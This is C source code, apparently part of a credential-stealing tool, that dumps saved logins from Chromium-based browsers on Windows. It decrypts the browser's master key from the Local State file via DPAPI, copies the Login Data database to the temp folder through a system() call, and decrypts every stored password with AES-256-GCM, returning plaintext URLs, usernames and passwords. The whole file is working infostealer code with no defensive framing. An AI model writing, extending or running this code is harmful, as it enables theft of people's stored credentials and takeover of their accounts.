#include "chromium.h"
#include <winbase.h>

int errnum;

ChromiumBrowser* initChromium( char *local_state, char *login_data, char* name)
{
    tempFolder = getenv("TEMP");
    ChromiumBrowser* browser = malloc(sizeof *browser);
    browser->localState = local_state;
    browser->loginData = login_data;
    browser->name = name;
    return browser;
}

DATA_BLOB* getChromiumMasterKey(ChromiumBrowser* browser)
{
    FILE* fp = fopen(browser->localState, "r");
    if( fp == NULL )
    {
#ifdef DEBUG
        fprintf(stderr, "Could'nt open %s Local State file\n", browser->name);
#endif
        return NULL;
    }

    if(fseek(fp, 0L, SEEK_END) != 0) {
        fclose(fp);
#ifdef DEBUG
        fprintf(stderr, "Could'nt Seek End in %s's Local State\n", browser->name);
#endif
        return NULL;
    }

    size_t bufferSize = ftell(fp);
    if(bufferSize == -1L) {
        fclose(fp);
#ifdef DEBUG
        fprintf(stderr, "Error while getting ftell() in %s's Local State\n", browser->name);
#endif
        return NULL;
    }

    char buffer[bufferSize+1];

    if(fseek(fp, 0L, SEEK_SET) != 0) {
        fclose(fp);
#ifdef DEBUG
        fprintf(stderr, "Could'nt Seek End in %s's Local State\n", browser->name);
#endif
        return NULL;
    }

    for(register int i = 0; i < bufferSize; i++)
        buffer[i] = fgetc(fp);

    fclose(fp);

    buffer[bufferSize] = 0;

    JsonNode* root = json_decode(buffer);
    JsonNode* os_crypt = json_find_member(root, "os_crypt");
    JsonNode* encrypted_key = json_find_member(os_crypt, "encrypted_key");

    size_t encrypted_key_size = strlen(encrypted_key->string_);

    strcpy_s(buffer, encrypted_key_size, encrypted_key->string_);
    buffer[encrypted_key_size] = 0;

    size_t decodedKeySize;
    unsigned char* key = base64_decode(buffer, encrypted_key_size, &decodedKeySize);
    json_delete(root);

    DATA_BLOB encrypted;
    encrypted.pbData = key + 5;
    encrypted.cbData = decodedKeySize - 5;

    DATA_BLOB *decrypted = malloc(sizeof *decrypted);

    if(!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, decrypted))
    {
#ifdef DEBUG
        fprintf(stderr, "Error Decrypting %s's Master Key: %ld\n",browser->name, GetLastError());
#endif
        free(decrypted);
        return NULL;
    }

    free(key);
    return decrypted;
}


credList* getChromiumCredentials(ChromiumBrowser* browser, unsigned char* MasterKey)
{
    credList* List = malloc(sizeof *List);
    if(List == NULL) {
#ifdef DEBUG
        fprintf(stderr, "Memory Allocation Error!\n");
#endif
        return NULL;
    }

    List->size = 0;

    char dbFile[strlen(tempFolder)+ strlen(browser->name) + 5];

    sprintf(dbFile, dbFormat,
            tempFolder, browser->name);

    char command[strlen(browser->loginData) + strlen(dbFile) + 15];

    sprintf(command, commandFormat,
            browser->loginData, dbFile);

    if(system(command) != 0)
    {
#ifdef DEBUG
        fprintf(stderr, "Could'nt Copy Database\n");
#endif
        return List;
    }
    
    sqlite3* db;

    if( sqlite3_open(dbFile, &db) != SQLITE_OK ) {
#ifdef DEBUG
        fprintf(stderr, "Can't open %s's database: %s\n", browser->name, sqlite3_errmsg(db));
#endif
        return List;
    }
#ifdef DEBUG
    else
        fprintf(stderr, "Opened %s's database successfully\n", browser->name);
#endif

    List->creds = malloc(sizeof *List->creds);

    sqlite3_stmt* stmt;

    if( sqlite3_prepare_v2(db,
                "SELECT signon_realm, username_value, password_value,"\
                " length(hex(password_value))/2, blacklisted_by_user"\
                " FROM logins",
                -1, &stmt, NULL)
            != SQLITE_OK )
    {
#ifdef DEBUG
        fprintf(stderr, "Could'nt %s's Prepare query\n", browser->name);
#endif
        return List;
    }
#ifdef DEBUG
    else
        fprintf(stderr, "Prepared %s's database successfully\n", browser->name);
#endif

    sodium_init();

    while(sqlite3_step(stmt) != SQLITE_DONE)
    {
        if(List->size != 0)
            List->creds = realloc(List->creds, sizeof *(List->creds) * (List->size+1));
        
        Credential* this = (List->creds + List->size);

        const char* url = (char*) sqlite3_column_text(stmt, 0);
        const size_t urlSize = strlen(url);

        const char* username = (char*)sqlite3_column_text(stmt, 1);
        const size_t usernameSize = strlen(username);

        const void* password = sqlite3_column_blob(stmt, 2);
        const int passSize = sqlite3_column_int(stmt, 3);

        const int blacklisted = sqlite3_column_int(stmt, 4);

        size_t decrypted_len;
        int sodiumRes;

        if(blacklisted)
            continue;

        this->url = malloc(sizeof *this->url * urlSize+1);
        if(this->url == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!\n");
#endif
            return List;
        }

        strcpy(this->url, url);
        this->url[urlSize] = 0;

        this->username = malloc(sizeof *this->username * usernameSize+1);
        if(this->username == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!\n");
#endif
            return List;
        }

        strcpy(this->username, username);
        this->username[usernameSize] = 0;

        sodiumRes = crypto_aead_aes256gcm_decrypt(
                NULL, &decrypted_len,
                NULL,
                (password+15), passSize-15,
                NULL,0,
                (password+3), MasterKey
            );


        char* decrypted = malloc(sizeof* decrypted *(decrypted_len + 1));
        if(decrypted == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!");
#endif
            return List;
        }

        sodiumRes = crypto_aead_aes256gcm_decrypt(
                (unsigned char*)decrypted, &decrypted_len,
                NULL,
                (password+15), passSize-15,
                NULL,0,
                (password+3), MasterKey
            );

        if(sodiumRes == 0){
            decrypted[decrypted_len] = 0;
            this->password = decrypted;
        }
        else 
        {
            free(decrypted);
            this->password = "Cannot Decrypt";
        }

        List->size++;
    }

    return List;
}


credList* dumpChromium(ChromiumBrowser *browser) {
    DATA_BLOB* key = getChromiumMasterKey(browser);
    if(key == NULL)
        return NULL;

    credList* Credentials = getChromiumCredentials(browser, key->pbData);
    LocalFree(key->pbData);
    free(key);
    return Credentials;
}
